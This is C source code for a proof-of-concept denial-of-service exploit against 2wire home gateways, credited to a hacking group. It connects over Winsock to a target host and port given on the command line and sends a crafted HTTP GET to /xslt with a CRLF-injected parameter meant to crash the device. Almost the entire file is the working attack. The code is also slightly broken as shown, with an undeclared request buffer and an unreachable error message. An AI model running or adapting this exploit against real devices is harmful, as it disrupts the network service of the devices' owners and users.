int state;

int main(int argc, char *argv[])
{
 printf("\n################################################\n");
 printf("####\n");
 printf("####          PoC of DoS 2wire_Gateway\n");
 printf("####               By Preth00nker\n");
 printf("####         http://www.mexhackteam.org\n");
 printf("####\n");
 printf("####\n\n");
     if  (argc<4){
     printf("[Usage] %s $Host $Port $Variable\n",argv[0]);
     printf("\n[I.E.] %s 192.168.1.254 80 PAGE\n",argv[0]);
     return 0;
     }
    //Crear socket
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2,2),&wsaData);
    SOCKET wsck;
    //Estructuras
    struct sockaddr_in Wins;
    struct hostent *target;
    //Wins
    Wins.sin_family=AF_INET;
    Wins.sin_port=htons((short)atoi(argv[2]));
    target=gethostbyname(argv[1]);
    Wins.sin_addr.s_addr=inet_addr(inet_ntoa(*(struct in_addr *)target->h_addr));
    //llamamos al socket
    wsck=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,(int unsigned)NULL,(int unsigned)NULL,(int 
unsigned)NULL);
    //Verifica por error
    if (wsck==SOCKET_ERROR){printf("Error al crear el socket =!..");WSACleanup();return 0;}
    printf("Socket creado correctamente!..  hWndl: %d",wsck);
    //Conecta
    if(WSAConnect(wsck,(SOCKADDR*)&Wins,sizeof(Wins),NULL,NULL,NULL,NULL)==SOCKET_ERROR){
        WSACleanup();
        return 0;
        printf("\nError al conectar =!..");
    }
    printf("\nConectado!..");
    //Make a bad query and send it ..Mwajuajua!..
    strcat(badreq,"GET /xslt?");
    strcat(badreq,argv[3]);
    strcat(badreq,"=%0D%0A HTTP/1.0\r\n");
    strcat(badreq,"Accept-Language: es-mx\r\n");
    strcat(badreq,"User-Agent: MexHackTeam\r\n");
    strcat(badreq,"Host: ");    
    strcat(badreq,argv[1]);
    strcat(badreq, "\r\n\r\n\r\n");
    send(wsck , badreq ,(int)strlen(badreq), 0);
    printf("\nDatos Mandados!.."); 
    //finalized
    Sleep(100);
    printf("\nThat's all, Check this out!...\n");
    WSACleanup();
    return 0;
}
//////////////////////////////////////////// [ EOF ]
////////////////////////////////////////////////////


